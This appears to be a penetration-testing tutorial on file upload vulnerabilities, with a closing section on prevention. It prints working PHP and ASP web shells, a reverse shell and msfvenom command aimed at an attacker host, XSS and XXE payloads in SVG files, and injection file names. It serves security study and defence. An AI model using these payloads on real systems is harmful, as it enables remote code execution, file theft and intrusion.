# File Upload Attacks

File upload vulns come from weak or missing validation of uploaded files. Worst case is an unauthenticated arbitrary file upload — any user, any file type, one step from code execution. Even non-arbitrary uploads (specific types only) can introduce XSS/XXE, DoS, or overwrite critical files if protections are missing. Outdated libraries cause these as often as insecure code.

## Absent Validation

No validation filters at all → upload a web shell or reverse shell script directly and visit its link. Tell-tale signs: the form mentions no allowed types, accepts any drag-and-dropped file (.php included), and the file selector says "All Files".

**Identify the framework first** — a web shell must be written in the language running the server (it calls platform-specific functions; not cross-platform). URL extensions usually give it away, but Web Routes frameworks hide them — and then uploaded files may not be directly routable either. Fallbacks:

- Visit `/index.ext` swapping in common extensions (php, asp, aspx, ...) — `http://<SERVER_IP>:<PORT>/index.php` returning the index page confirms PHP. Fuzz it with Burp Intruder + a Web Extensions wordlist instead of doing it manually. Not foolproof: some apps use no index page or multiple extensions.
- Wappalyzer browser extension — reveals language, web server + version, back-end OS, other technologies.
- Burp/ZAP scanners.

**Confirm execution** — write `<?php echo "Hello HTB";?>` to test.php, upload, visit `/uploads/test.php`. Message renders → PHP executed. Source code printed instead → no code execution.

## Upload Exploitation

**Web shells**: phpbash gives a terminal-like semi-interactive PHP shell. SecLists ships a pile of shells for many languages in its `/Web-Shells/` directory. Upload, visit the link, enumerate.

**Write your own** — may be the only option on engagements without internet access:

```php
<?php system($_REQUEST['cmd']); ?>
```

Interact via `?cmd=id`. View output through source-view (CTRL+U) to escape HTML rendering that mangles formatting. .NET equivalent:

```asp
<% eval request('cmd') %>
```

Web shells can fail when the server blocks the functions they use (e.g. `system()`) or a WAF interferes.

**Reverse shell**: pentestmonkey PHP reverse shell is reliable; SecLists also carries reverse shell scripts per language. Edit the IP/port lines in the script:

```php
$ip = '<ATTACKER_IP>';     // CHANGE THIS
$port = <LISTENING_PORT>;  // CHANGE THIS
```

Then listen, upload, visit the link:

```bash
nc -lvnp <LISTENING_PORT>
```

**Generate with msfvenom** — core framework functions beat unreliable command reverse shells, and msfvenom may bypass restrictions in place:

```bash
msfvenom -p php/reverse_php LHOST=<ATTACKER_IP> LPORT=<LISTENING_PORT> -f raw > reverse.php
```

Other languages: swap the `-p` payload and `-f` output format. Reverse shells are preferred but not guaranteed — egress firewalling or disabled functions can force you back to a web shell.

## Client-Side Validation

Front-end-only validation is fully under our control — the code executes in our browser. Tell: the page never refreshes or sends any HTTP request after selecting a file, so everything happens client-side. Two bypass routes: modify the upload request, or neuter the front-end code.

**Back-end request modification** — capture the upload POST in Burp. The two parts that matter are `filename="HTB.png"` and the file content at the end. Change filename to `shell.php`, swap the content for the web shell, forward. If the back-end does no validation of its own, it uploads and executes. (The file's Content-Type can also be changed, but doesn't matter at this stage.)

**Disabling front-end validation** — CTRL+SHIFT+C opens the Page Inspector; clicking the upload element highlights the input:

```html
<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
```

The `accept` attribute only filters the selection dialog — ignore it. The real check is `onchange="checkFile(this)"`. Pull its source from the Console (CTRL+SHIFT+K, type the function name) to confirm it's the validator, then just double-click the function name in the inspector and delete it — no JS editing needed. Upload the shell normally afterward. The edit is client-side and temporary, which is all we need. (Firefox flow; Chrome uses overrides.) Finding the uploaded path afterward: refresh, inspector, read the `<img src="/profile_images/shell.php">` URL.

## Blacklist Filters

Back-end validation kicks in when the Burp-modified request returns `Extension not allowed`. Extension validation comes in two flavors — blacklist (weakest) and whitelist — plus content/type checks. Blacklist flaw: never comprehensive.

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}
```

Also case-sensitive, lowercase only — on Windows (case-insensitive filenames) a mixed-case `pHp` may slip through and still execute.

**Fuzzing extensions**: PayloadsAllTheThings has PHP and .NET extension lists; SecLists has a common Web Extensions list. In Burp: grab the last `/upload.php` request from History → Send to Intruder → Clear positions → select just the extension in `filename="HTB.php"` → Add. Load the extensions list as payloads and un-tick URL Encoding so the `.` isn't encoded. Sort results by Length — responses matching the "File successfully uploaded" size passed validation; the rest errored.

**Non-blacklisted extensions**: not every allowed extension executes on every server config — try several. `.phtml` is the usual winner (PHP web servers often grant it execution rights). Upload the web shell as `shell.phtml`, visit `/profile_images/shell.phtml?cmd=id`.

## Whitelist Filters

Whitelists only allow listed extensions and don't need to be comprehensive — more secure, but same use-case split: blacklists fit wide-range upload features (file managers), whitelists fit narrow ones (profile images). Often used together. Fuzz with the same extension list to map what's allowed; error text ("Only images are allowed") doesn't reveal which validation type is in play.

The classic whitelist bug — regex checks the extension exists *anywhere* in the filename, not that the file *ends* with it:

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

**Double Extensions** — `shell.jpg.php` satisfies "contains .jpg" and still ends in .php. Upload via Burp, execute at `/profile_images/shell.jpg.php?cmd=id`. Blocked by a strict regex that anchors the end:

```php
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) { ...SNIP... }
```

**Reverse Double Extension** — the upload code may be solid while the *web server config* is the vuln. Apache's `/etc/apache2/mods-enabled/php7.4.conf` decides what executes PHP:

```xml
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>
```

Same missing-`$` mistake: any filename *containing* .phar/.php/.phtml gets PHP execution rights. So `shell.php.jpg` passes the app's strict whitelist (ends in .jpg) and still executes through the misconfiguration.

**Character Injection** — inject characters before/after the final extension to make the app misinterpret the filename:

```text
%20  %0a  %00  %0d0a  /  .\  .  …  :
```

Examples: `shell.php%00.jpg` on PHP 5.X and earlier (filename ends at the null byte, stored as shell.php); `shell.aspx:.jpg` on Windows (colon trick, written as shell.aspx). Generate all permutations for fuzzing:

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

Fuzz the filename position in Intruder with the generated wordlist — hits depend on outdated back-ends or server misconfigs.

## Type Filters

Extension checks alone aren't enough (shell.php.jpg proved it), so modern apps also validate content. Content filters check a category (images/videos/documents), not a list — two methods: Content-Type header and file content.

Fingerprint: `Only images are allowed` persists no matter what — `shell.jpg.phtml`, `shell.php.jpg`, even `shell.jpg` containing a web shell all fail → the app is checking content, not names.

**Content-Type** — browser sets this header from the file extension, i.e. client-side, i.e. controllable:

```php
$type = $_FILES['uploadFile']['type'];

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

Fuzz allowed types with SecLists' content-type list, filtered down to images first:

```bash
wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
```

(45 image types vs ~700 total.) Then set the file's Content-Type to an allowed one (e.g. `image/jpg`) in Burp and forward — `shell.php` uploads fine. Note: upload requests carry two Content-Type headers — the file's (bottom) and the request's (top). Usually modify the file's; if the content went out as POST data, only the main header exists, so modify that one.

**MIME-Type** — the more common check: inspect the file's first bytes (magic bytes / signature). `GIF87a`/`GIF89a` = GIF; plaintext = text file. GIF is the easiest signature to imitate — most image types use non-printable bytes, but `GIF8` is ASCII and common to both GIF variants:

```bash
echo "this is a text file" > text.jpg
file text.jpg    # ASCII text
echo "GIF8" > text.jpg
file text.jpg    # GIF image data
```

Server-side check:

```php
$type = mime_content_type($_FILES['uploadFile']['tmp_name']);

if (!in_array($type, array('image/jpg', 'image/jpeg', 'image/png', 'image/gif'))) {
    echo "Only images are allowed";
    die();
}
```

Bypass when Content-Type + MIME are both checked: prepend `GIF8` to the web shell and keep the `.php` extension — file passes as a GIF by content, executes as PHP by name:

```php
GIF8<?php system($_REQUEST['cmd']); ?>
```

(The `GIF8` prints before the command output — expected.) Mix and match layers to confuse robust filters: allowed MIME + disallowed Content-Type, allowed content + disallowed extension, and so on.

## Limited File Uploads

Even a properly locked-down upload form is attack surface — SVG, HTML, XML, and some image/document types can carry secondary attacks. Which is exactly why fuzzing allowed extensions matters: it maps what's achievable.

**XSS**:
- HTML uploads: no code execution, but embedded JavaScript runs on anyone who visits the uploaded page — XSS/CSRF from a trusted domain.
- Apps that display image metadata: inject the payload into a raw-text metadata field (Comment, Artist) with exiftool:

```bash
exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
exiftool HTB.jpg
```

Changing the image's MIME-Type to `text/html` can also get some apps to render it as a document, firing the payload even without metadata display.

- SVG (XML-based): embed a script directly:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">
    <rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />
    <script type="text/javascript">alert(window.origin);</script>
</svg>
```

**XXE** — SVG (or any displayed XML upload) can leak local files:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

More valuable: read the app's own source for whitebox testing — upload dir location, allowed extensions, naming scheme. PHP source via the filter wrapper:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<svg>&xxe;</svg>
```

PDF/Word/PowerPoint all embed XML structure — an XXE-vulnerable document viewer plus these uploads = blind XXE, and the same primitives give SSRF into internal services/private APIs.

**DoS**:
- XXE payloads themselves (per the Web Attacks module)
- Decompression bomb: nested ZIPs inside a ZIP, auto-unzip inflates to petabytes
- Pixel flood: JPG/PNG with compression data rewritten to `0xffff x 0xffff` (~4 Gigapixels) — display attempts allocate all memory and crash the server
- Oversized uploads where no size limit exists (fills the disk)
- Directory traversal in the filename (`../../../etc/passwd`) to write outside the uploads dir

## Other Upload Attacks

**Injections in file name** — if the filename gets reflected or processed, it's an injection point. OS command injection when the app moves files with shell commands (`mv $file /tmp`):

```text
file$(whoami).jpg
file`whoami`.jpg
file.jpg||whoami
```

XSS in the name (`<script>alert(window.origin);</script>`) fires when the name is displayed to the target; SQLi in the name (`file';select+sleep(5);--.jpg`) when it lands in a query unescaped.

**Upload Directory Disclosure** — feedback/submission forms don't show you the uploaded file's link. Find the uploads dir by fuzzing, or chain LFI/XXE to read the source (as above). Force error messages: upload a filename that already exists (or send two identical requests simultaneously — write failure may print the path), or a 5,000-character filename.

**Windows-specific attacks**:
- Reserved characters (`|`, `<`, `>`, `*`, `?`) unsanitized/unquoted may reference other files and error out the path
- Reserved names (`CON`, `COM1`, `LPT1`, `NUL`) can't be written — forced error, directory disclosure
- 8.3 short filename convention (still supported): `hackthebox.txt` = `HAC~1.TXT` / `HAC~2.TXT` (digit = order of matching HAC* files). Uploading `WEB~1.CON` overwrites web.conf — file overwrite, info disclosure via errors, DoS, or access to private files.

**Advanced** — any automatic processing of uploads (video encoding, compression, renaming) is exploitable if insecurely coded. Known library examples: the AVI upload XXE in ffmpeg. Custom code/libraries need deeper techniques — bug bounty reports are the best source for these.

## Preventing File Upload Vulnerabilities

**Extension Validation** — use whitelist *and* blacklist together: the blacklist catches malicious scripts if the whitelist regex is ever bypassed (shell.php.jpg). Blacklist matches the extension anywhere in the filename; whitelist anchors the end with `$`:

```php
$fileName = basename($_FILES["uploadFile"]["name"]);

// blacklist test
if (preg_match('/^.*\.ph(p|ps|ar|tml)/', $fileName)) {
    echo "Only images are allowed";
    die();
}

// whitelist test
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

Run validation on both back-end and front-end — front-end is bypassable but cuts noise/false alerts from unintended uploads.

**Content Validation** — never validate extension without content or vice versa, and the extension must match the content. Check both the HTTP Content-Type and the file signature (MIME):

```php
$fileName = basename($_FILES["uploadFile"]["name"]);
$contentType = $_FILES['uploadFile']['type'];
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name']);

// whitelist test
if (!preg_match('/^.*\.png$/', $fileName)) {
    echo "Only PNG images are allowed";
    die();
}

// content test
foreach (array($contentType, $MIMEtype) as $type) {
    if (!in_array($type, array('image/png'))) {
        echo "Only PNG images are allowed";
        die();
    }
}
```

**Upload Disclosure** — hide the uploads directory; serve downloads through a download.php script instead of direct links. The script needs strict authorization checks (file owned by/accessible to the authenticated user — IDOR defense) and path validation (no unsanitized input in file paths, strict allowlist of files/dirs — LFI defense). Direct requests to the uploads dir should 403. Serve files with:

- `Content-Disposition: attachment` — download instead of inline render
- `Content-Type` — correct MIME so the browser handles content properly
- `X-Content-Type-Options: nosniff` — no MIME sniffing

Randomize stored filenames, keep sanitized originals in a DB, and map back at download time — users then know neither the directory nor the filenames, and filename injections die too. Store uploads on a separate server/container so RCE compromises only the uploads host. Restrict app file access to its own directories (`open_basedir` in PHP).

**Further Security**:
- Disable dangerous functions via `disable_functions` in php.ini — `exec`, `shell_exec`, `system`, `passthru`, etc.
- Suppress system/server errors; handle at app level and print generic messages without filenames, directories, or raw errors
- Limit file size, update libraries, scan uploads for malware/malicious strings, run a WAF as a secondary layer

These double as the reporting checklist for a pentest — hand developers the gaps.